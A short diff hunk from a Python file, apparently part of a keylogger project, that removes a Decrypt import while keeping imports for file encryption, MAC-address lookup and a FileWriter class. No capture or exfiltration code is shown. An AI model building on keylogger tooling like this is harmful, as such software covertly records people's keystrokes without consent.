@@ -1,7 +1,6 @@
 import json
 from getmac import get_mac_address
 from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
-from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 
 class FileWriter:
     def __init__(self):
